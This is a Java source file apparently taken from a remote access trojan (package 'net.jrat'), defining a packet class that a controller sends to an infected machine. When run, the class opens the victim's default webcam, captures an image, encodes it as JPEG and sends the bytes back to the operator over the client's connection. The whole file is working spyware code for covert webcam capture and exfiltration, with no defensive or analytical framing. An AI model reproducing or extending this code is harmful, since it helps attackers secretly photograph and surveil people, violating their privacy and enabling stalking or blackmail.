package net.jrat.core.packet.server;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;

import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;

import net.jrat.core.Client;
import net.jrat.core.packet.IPacket;
import net.jrat.core.packet.client.C2PacketSaveFile;

public class S9PacketWebcam implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String outputpath;
	
	@Override
	public void execute(Object object) throws Exception
	{
		try
		{
			final Webcam webcam = Webcam.getDefault();
			final boolean open = webcam.open();
			
			if(!(open))
				throw new Exception("could not open webcam");
			
			final BufferedImage image = webcam.getImage();
			
			final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
			ImageIO.write(image, "jpg", outputStream);
			
			Client.instance.outputStream.writeObject(new C2PacketSaveFile(outputStream.toByteArray(), this.outputpath));
			outputStream.close();
		}
		catch(Exception e)
		{
			throw new Exception("could not open webcam: " + e.getMessage());
		}
	}
}